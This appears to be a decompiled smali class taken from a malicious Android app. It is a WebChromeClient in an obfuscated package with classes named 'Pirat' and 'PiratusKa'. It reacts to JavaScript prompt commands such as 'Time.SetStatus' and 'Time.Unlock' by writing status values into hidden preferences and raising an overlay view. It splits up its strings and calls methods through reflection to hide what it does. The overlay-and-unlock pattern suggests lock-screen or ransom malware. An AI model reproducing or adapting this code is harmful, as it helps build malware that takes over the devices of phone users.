.class public Lsojgp/zdga/pwrjbzetltzu/MyJavaScriptChromeClientTime;
.super Landroid/webkit/WebChromeClient;
.source "MyJavaScriptChromeClientTime.java"


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# instance fields
.field private bnew:Lsojgp/zdga/pwrjbzetltzu/Zakrivaem;

.field private m_context:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 25
    invoke-direct {p0}, Landroid/webkit/WebChromeClient;-><init>()V

    .line 26
    iput-object p1, p0, Lsojgp/zdga/pwrjbzetltzu/MyJavaScriptChromeClientTime;->m_context:Landroid/content/Context;

    .line 27
    return-void
.end method

.method private capitalize(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "s"    # Ljava/lang/String;

    .prologue
    .line 131
    if-eqz p1, :cond_0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v1

    if-nez v1, :cond_2

    .line 132
    :cond_0
    const-string p1, ""

    .line 138
    .end local p1    # "s":Ljava/lang/String;
    :cond_1
    :goto_0
    return-object p1

    .line 134
    .restart local p1    # "s":Ljava/lang/String;
    :cond_2
    const/4 v1, 0x0

    invoke-virtual {p1, v1}, Ljava/lang/String;->charAt(I)C

    move-result v0

    .line 135
    .local v0, "first":C
    invoke-static {v0}, Ljava/lang/Character;->isUpperCase(C)Z

    move-result v1

    if-nez v1, :cond_1

    .line 138
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/Character;->toUpperCase(C)C

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v2, 0x1

    invoke-virtual {p1, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_0
.end method


# virtual methods
.method public getDeviceName()Ljava/lang/String;
    .locals 4

    .prologue
    .line 120
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    .line 121
    .local v0, "manufacturer":Ljava/lang/String;
    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    .line 122
    .local v1, "model":Ljava/lang/String;
    invoke-virtual {v1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 123
    invoke-direct {p0, v1}, Lsojgp/zdga/pwrjbzetltzu/MyJavaScriptChromeClientTime;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 125
    :goto_0
    return-object v2

    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {p0, v0}, Lsojgp/zdga/pwrjbzetltzu/MyJavaScriptChromeClientTime;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_0
.end method

.method public loadPreferences()Ljava/lang/String;
    .locals 9

    .prologue
    .line 36
    const-string v0, "ste"

    .line 37
    .local v0, "dfd":Ljava/lang/String;
    iget-object v6, p0, Lsojgp/zdga/pwrjbzetltzu/MyJavaScriptChromeClientTime;->m_context:Landroid/content/Context;

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "sy"

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "ma"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x0

    invoke-virtual {v6, v7, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    invoke-interface {v6}, Landroid/content/SharedPreferences;->getAll()Ljava/util/Map;

    move-result-object v4

    .line 38
    .local v4, "prefs":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;*>;"
    const-string v2, ""

    .line 39
    .local v2, "out":Ljava/lang/String;
    invoke-interface {v4}, Ljava/util/Map;->keySet()Ljava/util/Set;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v7

    :goto_0
    invoke-interface {v7}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-nez v6, :cond_0

    .line 63
    return-object v2

    .line 39
    :cond_0
    invoke-interface {v7}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    .line 40
    .local v1, "key":Ljava/lang/String;
    invoke-interface {v4, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    .line 41
    .local v3, "pref":Ljava/lang/Object;
    const-string v5, ""

    .line 42
    .local v5, "printVal":Ljava/lang/String;
    instance-of v6, v3, Ljava/lang/Boolean;

    if-eqz v6, :cond_1

    .line 43
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, " : "

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object v6, v3

    check-cast v6, Ljava/lang/Boolean;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 45
    :cond_1
    instance-of v6, v3, Ljava/lang/Float;

    if-eqz v6, :cond_2

    .line 46
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, " : "

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object v6, v3

    check-cast v6, Ljava/lang/Float;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 48
    :cond_2
    instance-of v6, v3, Ljava/lang/Integer;

    if-eqz v6, :cond_3

    .line 49
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, " : "

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object v6, v3

    check-cast v6, Ljava/lang/Integer;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 51
    :cond_3
    instance-of v6, v3, Ljava/lang/Long;

    if-eqz v6, :cond_4

    .line 52
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, " : "

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object v6, v3

    check-cast v6, Ljava/lang/Long;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 54
    :cond_4
    instance-of v6, v3, Ljava/lang/String;

    if-eqz v6, :cond_5

    .line 55
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, " : "

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object v6, v3

    check-cast v6, Ljava/lang/String;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 57
    :cond_5
    instance-of v6, v3, Ljava/util/Set;

    if-eqz v6, :cond_6

    .line 58
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, " : "

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    check-cast v3, Ljava/util/Set;

    .end local v3    # "pref":Ljava/lang/Object;
    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 60
    :cond_6
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, " -- "

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto/16 :goto_0
.end method

.method public onJsAlert(Landroid/webkit/WebView;Ljava/lang/String;Ljava/lang/String;Landroid/webkit/JsResult;)Z
    .locals 1
    .param p1, "view"    # Landroid/webkit/WebView;
    .param p2, "url"    # Ljava/lang/String;
    .param p3, "message"    # Ljava/lang/String;
    .param p4, "result"    # Landroid/webkit/JsResult;

    .prologue
    .line 32
    const/4 v0, 0x1

    return v0
.end method

.method public onJsPrompt(Landroid/webkit/WebView;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/webkit/JsPromptResult;)Z
    .locals 10
    .param p1, "view"    # Landroid/webkit/WebView;
    .param p2, "url"    # Ljava/lang/String;
    .param p3, "message"    # Ljava/lang/String;
    .param p4, "defaultValue"    # Ljava/lang/String;
    .param p5, "result"    # Landroid/webkit/JsPromptResult;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    .prologue
    .line 68
    const-string v7, "messa"

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "uu="

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " ^^ "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {p0}, Lsojgp/zdga/pwrjbzetltzu/MyJavaScriptChromeClientTime;->loadPreferences()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 69
    const-string v7, "Time."

    invoke-virtual {p3, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_0

    .line 70
    invoke-super/range {p0 .. p5}, Landroid/webkit/WebChromeClient;->onJsPrompt(Landroid/webkit/WebView;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/webkit/JsPromptResult;)Z

    move-result v7

    .line 117
    :goto_0
    return v7

    .line 72
    :cond_0
    const-string v3, "e.SetS"

    .line 73
    .local v3, "erfewr":Ljava/lang/String;
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "Tim"

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "tatus"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {p3, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 74
    const-string v0, "ste"

    .line 75
    .local v0, "dfd":Ljava/lang/String;
    iget-object v7, p0, Lsojgp/zdga/pwrjbzetltzu/MyJavaScriptChromeClientTime;->m_context:Landroid/content/Context;

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "sy"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "ma"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    .line 76
    .local v6, "userDetails":Landroid/content/SharedPreferences;
    new-instance v5, Lsojgp/zdga/pwrjbzetltzu/Pirat;

    invoke-direct {v5, v6}, Lsojgp/zdga/pwrjbzetltzu/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 77
    .local v5, "rtrtr":Lsojgp/zdga/pwrjbzetltzu/Pirat;
    invoke-virtual {v5}, Lsojgp/zdga/pwrjbzetltzu/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 78
    .local v2, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v4, Lsojgp/zdga/pwrjbzetltzu/PiratusKa;

    invoke-direct {v4}, Lsojgp/zdga/pwrjbzetltzu/PiratusKa;-><init>()V

    .line 79
    .local v4, "putt":Lsojgp/zdga/pwrjbzetltzu/PiratusKa;
    const-string v7, "putString"

    const-string v8, "status"

    invoke-virtual {v4, v2, v7, v8, p4}, Lsojgp/zdga/pwrjbzetltzu/PiratusKa;->runus(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 82
    const-string v1, "ppl"

    .line 84
    .local v1, "dfdsfsd":Ljava/lang/String;
    :try_start_0
    const-string v7, "android.content.SharedPreferences$Editor"

    invoke-static {v7}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "a"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "y"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v7

    const/4 v8, 0x0

    invoke-virtual {v7, v2, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    .line 89
    :goto_1
    sget-object v7, Lsojgp/zdga/pwrjbzetltzu/EtroDetra;->overlayView:Lsojgp/zdga/pwrjbzetltzu/BigView;

    if-eqz v7, :cond_1

    .line 90
    sget-object v7, Lsojgp/zdga/pwrjbzetltzu/EtroDetra;->overlayView:Lsojgp/zdga/pwrjbzetltzu/BigView;

    const-string v8, "deerda3"

    invoke-virtual {v7, v8}, Lsojgp/zdga/pwrjbzetltzu/BigView;->showpage(Ljava/lang/String;)V

    .line 92
    :cond_1
    const-string v7, "ok"

    invoke-virtual {p5, v7}, Landroid/webkit/JsPromptResult;->confirm(Ljava/lang/String;)V

    .line 95
    .end local v0    # "dfd":Ljava/lang/String;
    .end local v1    # "dfdsfsd":Ljava/lang/String;
    .end local v2    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v4    # "putt":Lsojgp/zdga/pwrjbzetltzu/PiratusKa;
    .end local v5    # "rtrtr":Lsojgp/zdga/pwrjbzetltzu/Pirat;
    .end local v6    # "userDetails":Landroid/content/SharedPreferences;
    :cond_2
    const-string v7, "Time.Unlock"

    invoke-virtual {p3, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_3

    .line 96
    const-string v0, "ste"

    .line 97
    .restart local v0    # "dfd":Ljava/lang/String;
    iget-object v7, p0, Lsojgp/zdga/pwrjbzetltzu/MyJavaScriptChromeClientTime;->m_context:Landroid/content/Context;

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "sy"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "ma"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    .line 98
    .restart local v6    # "userDetails":Landroid/content/SharedPreferences;
    new-instance v5, Lsojgp/zdga/pwrjbzetltzu/Pirat;

    invoke-direct {v5, v6}, Lsojgp/zdga/pwrjbzetltzu/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 99
    .restart local v5    # "rtrtr":Lsojgp/zdga/pwrjbzetltzu/Pirat;
    invoke-virtual {v5}, Lsojgp/zdga/pwrjbzetltzu/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 100
    .restart local v2    # "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v4, Lsojgp/zdga/pwrjbzetltzu/PiratusKa;

    invoke-direct {v4}, Lsojgp/zdga/pwrjbzetltzu/PiratusKa;-><init>()V

    .line 101
    .restart local v4    # "putt":Lsojgp/zdga/pwrjbzetltzu/PiratusKa;
    const-string v7, "putString"

    const-string v8, "status"

    const-string v9, "s9"

    invoke-virtual {v4, v2, v7, v8, v9}, Lsojgp/zdga/pwrjbzetltzu/PiratusKa;->runus(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 104
    const-string v1, "ppl"

    .line 106
    .restart local v1    # "dfdsfsd":Ljava/lang/String;
    :try_start_1
    const-string v7, "android.content.SharedPreferences$Editor"

    invoke-static {v7}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "a"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "y"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v7

    const/4 v8, 0x0

    invoke-virtual {v7, v2, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    .line 111
    :goto_2
    const-string v7, "ok"

    invoke-virtual {p5, v7}, Landroid/webkit/JsPromptResult;->confirm(Ljava/lang/String;)V

    .line 112
    new-instance v7, Lsojgp/zdga/pwrjbzetltzu/Zakrivaem;

    invoke-direct {v7}, Lsojgp/zdga/pwrjbzetltzu/Zakrivaem;-><init>()V

    iput-object v7, p0, Lsojgp/zdga/pwrjbzetltzu/MyJavaScriptChromeClientTime;->bnew:Lsojgp/zdga/pwrjbzetltzu/Zakrivaem;

    .line 117
    .end local v0    # "dfd":Ljava/lang/String;
    .end local v1    # "dfdsfsd":Ljava/lang/String;
    .end local v2    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v4    # "putt":Lsojgp/zdga/pwrjbzetltzu/PiratusKa;
    .end local v5    # "rtrtr":Lsojgp/zdga/pwrjbzetltzu/Pirat;
    .end local v6    # "userDetails":Landroid/content/SharedPreferences;
    :cond_3
    const/4 v7, 0x1

    goto/16 :goto_0

    .line 108
    .restart local v0    # "dfd":Ljava/lang/String;
    .restart local v1    # "dfdsfsd":Ljava/lang/String;
    .restart local v2    # "editor":Landroid/content/SharedPreferences$Editor;
    .restart local v4    # "putt":Lsojgp/zdga/pwrjbzetltzu/PiratusKa;
    .restart local v5    # "rtrtr":Lsojgp/zdga/pwrjbzetltzu/Pirat;
    .restart local v6    # "userDetails":Landroid/content/SharedPreferences;
    :catch_0
    move-exception v7

    goto :goto_2

    .line 86
    :catch_1
    move-exception v7

    goto/16 :goto_1
.end method
